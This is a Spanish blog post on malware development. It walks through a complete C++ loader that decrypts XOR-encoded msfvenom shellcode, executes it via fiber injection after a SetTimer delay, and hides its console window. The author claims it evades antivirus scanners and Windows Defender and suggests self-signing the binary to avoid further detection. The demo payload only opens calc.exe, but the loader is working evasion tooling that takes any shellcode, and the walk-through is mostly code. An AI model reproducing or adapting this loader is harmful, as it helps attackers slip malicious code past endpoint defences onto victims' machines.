---
layout: post
title: Inyeccion de shellcode via Fiber injection + Timming attack (SetTimer)
author: c4rta
date: 2023-06-16
tags: [MalDev]
image: /assets/img/bypassAV_fiber/waifu.png
---
Desarrollaremos un programa en C++ para inyectar una shellcode cifrada con XOR, ademas evadiremos los antivirus usando la tecnica Fiber Injection y un Timming Attack
{:.lead}

Que ondaa, esta vez te voy a enseñar como pude evadir la deteccion de algunos antivirus de antiscan.me, y como evadir el windows defender, para esto use 3 cosas

- Una shellcode cifrada con XOR
- La tecnica ```fiber injection```
- Timming attack usando ```SetTimer```

## Fibers (Fibras)

Como sabras, cuando se ejecuta una aplicacion, el sistema operativo le asigna un proceso dentro de la memoria, por ejemplo, los procesos que ves al abrir al administrador de tereas, pues bien, esos procesos pueden tener otros subprocesos para ejecutar tareas en paralelo, a esto se le conoce como hilos, y es algo clave en la programacion concurrente, sin embargo, dentro de un hilo se puede estar ejecutando otra tarea, y para esto se usan las fibras.

La definicion que nos da la WinAPI, es: **"Una fibra es una unidad de ejecución que la aplicación debe programar manualmente"**, pero la neta no se le entiende casi nada, asi que pongamos algo mas simple, una fibra tambien es conocida como un ```hilo liviano```, es decir, una unidad de ejeucion que desprende de un hilo, osea que las fibras se ejecutan en el contexto del hilo que las creo, una caracteristica, es que un hilo puede tener varias fibras pero solo una puede ejecutarse una sola a la vez, y nosotros dedicimos cual, amenos que usemos SwitchToFiber para intercalar la ejecución 

## Timming attack o ataques basados en temporizadores

En el contexto del desarrollo de malware, un timming attack se refiere a suspender o dormir la actividad del malware por un cierto periodo de tiempo, por ejemplo, podemos agregar un delay cuando se ejecute por primera vez, o podemos decirle al malware que ejecute sus acciones en una fecha, hora, dia, y momento especifico, es decir, cada cierto tiempo, para estas implementaciones se usan funciones de temporizado, de ahi su nombre.

**Ojo**: esto solo seria en el contexto del malware, tambien hay otro contexto de los timming attack que son los ```side channel timing attack``` o en español, ```ataques de canal lateral basados en temporizadores```, pero eso es otro tema que no importa en este momento.

### Fiber injection

Es muy simple, la inyeccion de fibras se refiere a inyectar una fibra en el flujo de ejecucion del proceso, para implementar una inyeccion clasica de este tipo, se usan las funciones.

- **ConvertThreadToFiber()**: Para convertir el hilo principal en una fibra
- **VirtualAlloc()**: Para asignar memoria para la fibra
- **CreateFiber()**: Para crear una nueva fibra que contendra la shellcode
- **SwitchToFiber()**: Para ejecutar la fibra que tiene la shellcode

Llamando a las funciones en ese orden podriamos hacer una fiber injection clasica, pero al fin de cuenta esto es programacion, y cada quien la puede implementar como le sale de su cabecita, o dependiendo del contexto donde se vaya a ejecutar, ahora te voy a explicar como la implemente, primero de pondre todo el codigo y te explicare que es lo que hace

#### Codigo completo
Fue escrito y compilado desde Dev C++

```cpp
#include <windows.h>
#include <winuser.h>

void fiber_injection(){
	unsigned char shellcode[] = {
	    "\x86\x32\xf9\x9e\x8a\x92\xba\x7a\x7a\x7a\x3b\x2b\x3b\x2a"
	    "\x28\x2b\x2c\x32\x4b\xa8\x1f\x32\xf1\x28\x1a\x32\xf1\x28"
	    "\x62\x32\xf1\x28\x5a\x32\xf1\x08\x2a\x32\x75\xcd\x30\x30"
	    "\x37\x4b\xb3\x32\x4b\xba\xd6\x46\x1b\x06\x78\x56\x5a\x3b"
	    "\xbb\xb3\x77\x3b\x7b\xbb\x98\x97\x28\x3b\x2b\x32\xf1\x28"
	    "\x5a\xf1\x38\x46\x32\x7b\xaa\xf1\xfa\xf2\x7a\x7a\x7a\x32"
	    "\xff\xba\x0e\x1d\x32\x7b\xaa\x2a\xf1\x32\x62\x3e\xf1\x3a"
	    "\x5a\x33\x7b\xaa\x99\x2c\x32\x85\xb3\x3b\xf1\x4e\xf2\x32"
	    "\x7b\xac\x37\x4b\xb3\x32\x4b\xba\xd6\x3b\xbb\xb3\x77\x3b"
	    "\x7b\xbb\x42\x9a\x0f\x8b\x36\x79\x36\x5e\x72\x3f\x43\xab"
	    "\x0f\xa2\x22\x3e\xf1\x3a\x5e\x33\x7b\xaa\x1c\x3b\xf1\x76"
	    "\x32\x3e\xf1\x3a\x66\x33\x7b\xaa\x3b\xf1\x7e\xf2\x32\x7b"
	    "\xaa\x3b\x22\x3b\x22\x24\x23\x20\x3b\x22\x3b\x23\x3b\x20"
	    "\x32\xf9\x96\x5a\x3b\x28\x85\x9a\x22\x3b\x23\x20\x32\xf1"
	    "\x68\x93\x2d\x85\x85\x85\x27\x32\xc0\x7b\x7a\x7a\x7a\x7a"
	    "\x7a\x7a\x7a\x32\xf7\xf7\x7b\x7b\x7a\x7a\x3b\xc0\x4b\xf1"
	    "\x15\xfd\x85\xaf\xc1\x8a\xcf\xd8\x2c\x3b\xc0\xdc\xef\xc7"
	    "\xe7\x85\xaf\x32\xf9\xbe\x52\x46\x7c\x06\x70\xfa\x81\x9a"
	    "\x0f\x7f\xc1\x3d\x69\x08\x15\x10\x7a\x23\x3b\xf3\xa0\x85"
	    "\xaf\x19\x1b\x16\x19\x54\x1f\x02\x1f\x7a"
	};

	for (int i = 0; i < sizeof(shellcode); i++){
		shellcode[i] = (byte)(shellcode[i] ^ (byte)'z');
	}

  	unsigned int shellcode_len = sizeof(shellcode);

	LPVOID exec_mem;
	LPVOID shellcode_fiber; 

	exec_mem = VirtualAlloc(
	    NULL,
	    shellcode_len,
	    MEM_COMMIT,
	    PAGE_EXECUTE_READWRITE
	);

	memcpy(exec_mem, shellcode, shellcode_len);
	shellcode_fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)exec_mem, NULL);

  	SwitchToFiber(shellcode_fiber);

  	DeleteFiber(shellcode_fiber);
  	VirtualFree(exec_mem, 0, MEM_RELEASE);
}

VOID CALLBACK shellcode_routine(PVOID param){
	UINT_PTR timerId = SetTimer(NULL, 0, 20000, [](HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {
    	fiber_injection();
    	KillTimer(NULL, idEvent);
  	});

  	MSG msg;
  	while (GetMessage(&msg, NULL, 0, 0)){	
    	TranslateMessage(&msg);
    	DispatchMessage(&msg);
  	}
}

int main(){
	
	HWND ventana_cmd = GetConsoleWindow();
	ShowWindow(ventana_cmd, SW_HIDE);

	LPVOID main_fiber = ConvertThreadToFiber(NULL);
  	LPVOID shellcode_fiber = CreateFiber(NULL, shellcode_routine, NULL);
  	SwitchToFiber(shellcode_fiber);
  	SwitchToFiber(main_fiber);

  	return 0;
}
```

## Funcion fiber_injection()

- Dentro de la funcion ```fiber_injection()``` tenemos la definicion de nuestra shellcode, esa shellcode fue generada con msfvenom usando crifrado XOR la cual ejecuta el comando ```calc.exe```: ```msfvenom -p windows/x64/exec CMD=calc.exe -f c --encrypt xor --encrypt-key z```.

(te recomiendo cambiar la clave del cifrado XOR)

- Posteriormente para poder inyectar la shellcode, la debemos de decifrar en tiempo de ejecucion usando la operacion ```XOR``` con la clave de cifrado, y para eso usamos este for:

```cpp
for (int i = 0; i < sizeof(shellcode); i++){
	shellcode[i] = (byte)(shellcode[i] ^ (byte)'z');
}
```

- Usando ```unsigned int shellcode_len = sizeof(shellcode);``` le estamos diciendo que obtenga el tamaño total en bytes de la shellcode

- Despues necesitamos asignar memoria para nuestra shellcode, para esto usamos ```VirtualAlloc```:

```cpp
exec_mem = VirtualAlloc(
	    NULL,
	    shellcode_len,
	    MEM_COMMIT,
	    PAGE_EXECUTE_READWRITE
);
```
El primer parametro de la direccion de memoria donde se va a asignar, y le puse NULL para que el sistema operativo lo haga, el segundo parametro es el tamaño en bytes que se van a asignar, y le pase la variable que tiene el tamaño, el tercero es el tipo de asignacion y le puse ```MEM_COMMIT``` para que inicialmente la asignacion contenga puros ceros, y el ultimo argumento son las protecciones de memoria que tendra esa asignacion, y le puse que tenga permisos de ejecucion, escritura, y lectura

- Despues se copia la shellcode en la memoria que se asigno con ```VirtualAlloc```:

```cpp
memcpy(exec_mem, shellcode, shellcode_len);
```

- A este punto ya tenemos la memoria lista para nuestra shellcode, ahora debemos de crear una fibra, para eso usamos ```CreateFiber```:

```cpp
shellcode_fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)exec_mem, NULL);
```

Lo que esta haciendo es crear una fibra, donde la ejecucion de la fibra comienza desde la direccion que regresa ```VirtualAlloc```, el primer parametro es el tamaño del stack de la fibra, le puse en 0 para que agarre el tamaño por defecto, el segundo parametro es la direccion inicial de la fibra, y observa que el segundo parametro se agrego de esta forma ```(LPFIBER_START_ROUTINE)exec_mem```, y lo que esta haciendo ```LPFIBER_START_ROUTINE``` es definir un puntero como una rutina, que vendria siendo una funcion de callback a nuestra direccion de inicio de la fibra, la cual se encuentra en ```exec_mem```

- Despues de que creamos la fibra, debemos de restaurar el estado de la fibra de la shellcode para ejecutarla, para eso usamos

```cpp
SwitchToFiber(shellcode_fiber);
```

El unico parametro que recibe es la direccion de la fibra, la cual se almacena en ```shellcode_fiber```.

- Las ultima dos funciones solo son para eliminar la fibra despues de que se ejecute y liberar memoria

Asi que todo lo que se encuentra dentro de la funcion ```fiber_injection``` es solamente para hacer una clasica inyeccion de fibras, a este punto ya se implemento la primera tecnica, y para que esa funcion se ejecute solo hay que llamarla asi ```fiber_injection()```

---

## Funcion shellcode_routine (callback)

- Despues en el codigo tenemos una funcion callback, donde se implementa la segunda tecnica (timming attack), esta implementacion del callback vendria siendo una implementacio manual de ```LPFIBER_START_ROUTINE```

- Lo que tenemos primero es un temporizador que agregara un delay de 20 segundos antes de ejecutar la fibra que contiene la shellcode:

```cpp
UINT_PTR timerId = SetTimer(NULL, 0, 20000, [](HWND hwnd, UINT uMsg, UINT_PTR idEvent, DWORD dwTime) {
    fiber_injection();witchToFiber(shellcode_fiber);
    KillTimer(NULL, idEvent);
});	

```

Dentro de los parametros de ```SetTimer``` le indicamos en milisegundos el tiempo que va a esperar para ejecutarse lo que se encuentre dentro, y en este caso es la llamada a la funcion ```fiber_injection```, esto es una clasica implementacion de un timming attack que agrega un pequeño delay al inicio de la ejecucion del malware para evadir los antivirus

- Despues tenemos un pequeño bucle declarado de esta forma:

```cpp
while (GetMessage(&msg, NULL, 0, 0)){	
    	TranslateMessage(&msg);
    	DispatchMessage(&msg);
}
```

Donde con ```GetMessage``` le estamos diciendo que se siga ejecutando hasta que reciba una señal de salida, esa señal de salida se manda a llamar desde ```TranslateMessage``` y ```DispatchMessage```, esto se usa por que debemos de procesar los mensajes, y con ayuda de esas funciones, la fibra esta respondiendo a los mensajes recibidos y manteniendo la ejecución en curso.

Asi que toda la funcion ```VOID CALLBACK shellcode_routine``` implementa una funcion de callback para hacer un timming attack en la fibra de la shellcode.

---

## Funcion Main

A este punto ya solo nos queda mandar a llamar a la funcion ```main()```,

- Lo primero que tenemos en el main son dos funciones que lo que hacen es ocultar la ventana del cmd que se abre al ejecutar el binario:

```cpp
HWND ventana_cmd = GetConsoleWindow();
ShowWindow(ventana_cmd, SW_HIDE);
```

- Despues se esta conviertiendo el hilo principal en una fibra:

```cpp
LPVOID main_fiber = ConvertThreadToFiber(NULL);
```
Esto con el fin de cambiar de contexto entre las fibras

- La funcion que sigue crea una fibra donde el segundo parametro es el callback creado anteriormente:

```cpp
LPVOID shellcode_fiber = CreateFiber(NULL, shellcode_routine, NULL);
```

- Despues ejecuta la fibra creada anteriormente:

```cpp
witchToFiber(shellcode_fiber);
```

- Y por ultimo ejecuta la fibra principal

```cpp
SwitchToFiber(main_fiber);
```

Como te daras cuenta, se ejecutan 3 fibras

- La fibra principal
- La fibra de la shellcode que manda a llamar al callback ```shellcode_routine```
- Y la fibra de la funcion ```fiber_injection```, yo la llamo la ```fibra comodin```

Ahora te preguntaras "¿Por que 3 fibras, si solo una es la que inyecta la shellcode?", pues ahi te va la explicacion de por que las 3 fibras evaden los antivirus

Las 3 fibras se usan de la siguiente manera, cuando en el main se ejecuta la primera fibra que manda a llamar a ```shellcode_routine```, lo que va a pasar es que entrara a la funcion callback y esperara 20 segundos para ejecutar la ```fibra comodin```, mientras que a su vez en el main se hace un llamado para ejectutar otra fibra, que es la fibra principal (main_fiber), y lo que estaria pasando es que la fibra que mando a llamar a ```shellcode_routine``` y la ```main_fiber``` se estarian ejecutandose en contextos diferentes, permitiendo que la ejecucion de la ```fibra comidin``` pase desapercibida por los antivirus ocultando su actividad e inyectando la shellcode mientras que el programa sigue fluyendo normalmente ejecutandose en el hilo principal mediante la ```main_fiber```, asi que los antivirus lo unico que estarian detectando es la ```main_fiber``` que no tiene un comportamiendo extraño, Genial, ¿No?.

#### Resultados

0/26 antiscan.me - Fecha: 15 de junio del 2023

![](/assets/img/bypassAV_fiber/antiscanme.png)

Bypass Windows defender:

<video src="/assets/img/bypassAV_fiber/poc.mp4" controls="controls" width="720"></video>

#### Mejoras rapidas

Aun que el defender no lo haya detectado, es evidente que se puede mejorar para evitar la deteccion cuando se descarga e intenta ejecutar un software desconocido, es decir, cuando no tiene ninguna firma de un certificado de autenticidad, para evadir eso, puedes firmar el malware generando un certificado tu mismo

Eso ha sido todo, gracias por leer ❤